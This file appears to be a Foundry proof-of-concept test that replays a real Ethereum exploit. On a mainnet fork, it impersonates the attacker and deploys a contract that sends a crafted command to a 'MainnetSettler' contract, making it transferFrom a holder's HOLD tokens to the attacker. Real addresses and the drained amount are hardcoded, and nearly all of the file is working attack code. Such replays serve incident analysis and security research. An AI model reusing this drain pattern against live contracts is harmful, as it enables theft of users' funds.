
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 21230767;
    uint256 constant TX_TIMESTAMP = 1732127687;
    uint256 constant TX_BLOCK_NUMBER = 21230768;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        SettlerDrainAttack attack = _setupAttack();
        _prepareProfit(address(attack), ATTACK_CONTRACT);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _setupAttack() internal returns (SettlerDrainAttack attack) {
        _installAttackCode();
        attack = SettlerDrainAttack(payable(ATTACK_CONTRACT));
        attack.bindAttackChild(ATTACK_CONTRACT);
    }

    function _installAttackCode() internal {
        vm.etch(ATTACK_CONTRACT, type(SettlerDrainAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(
            Addresses.attacker_eoa, address(0), Addresses.Hold, "Hold", Constants.HOLD_PROFIT_AMOUNT
        );
    }
}

contract SettlerDrainAttack {
    bytes4 private constant SETTLER_HOLD_PULL = bytes4(0x38c9c147);

    SettlerDrainChild public attackChild;

    constructor() payable {
        _initSelfChild();
    }

    function attack() external payable {
        executeSetup();
    }

    function executeSetup() public payable {
        if (address(attackChild) == address(0)) _initSelfChild();
        settleHoldProfit();
    }

    function settleHoldProfit() public {


        IMainnetSettler(Addresses.MainnetSettler)
            .execute(
                SettlerContext({field0: Addresses.ZERO, field1: Addresses.ZERO, field2: 0}),
                _settlerCommands(),
                Constants.SETTLER_DOMAIN
            );
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = SettlerDrainChild(payable(attackChildAddress));
    }

    function _initSelfChild() internal {
        attackChild = SettlerDrainChild(payable(address(this)));
    }

    function _settlerCommands() internal pure returns (bytes[] memory commands) {
        commands = new bytes[](1);
        commands[0] = _pullHoldCommand();
    }

    function _pullHoldCommand() internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            SETTLER_HOLD_PULL, uint256(0), uint256(10_000), Addresses.Hold, uint256(0), _erc20Pull()
        );
    }

    function _erc20Pull() internal pure returns (bytes memory) {
        return abi.encodeWithSelector(
            IERC20Like.transferFrom.selector,
            Addresses.holdSource,
            Addresses.attacker_eoa,
            Constants.HOLD_PROFIT_AMOUNT
        );
    }

    receive() external payable {}

    fallback() external payable {}
}

contract SettlerDrainChild {
    receive() external payable {}

    fallback() external payable {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x3A38877312D1125d2391663CBa9f7190953Bf2d9;
    address internal constant Hold = 0x68B36248477277865c64DFc78884Ef80577078F3;
    address internal constant MainnetSettler = 0x70bf6634eE8Cb27D04478f184b9b8BB13E5f4710;
    address internal constant attack_contract = 0x95b4FEcf1F5b9C56CE51EBfEDd582C5F40F2Ef8c;
    address internal constant holdSource = 0xA31d98b1aA71a99565EC2564b81f834E90B1097b;
}

library Constants {
    uint256 internal constant HOLD_PROFIT_AMOUNT = 308453642481581939556432141;
    bytes32 internal constant SETTLER_DOMAIN =
        bytes32(hex"e0b1db9e7c871328327e3f9e0000000000000000000000000000000000000000");
}

struct SettlerContext {
    address field0;
    address field1;
    uint256 field2;
}

interface IMainnetSettler {
    function execute(SettlerContext calldata, bytes[] calldata, bytes32) external returns (uint256);
}
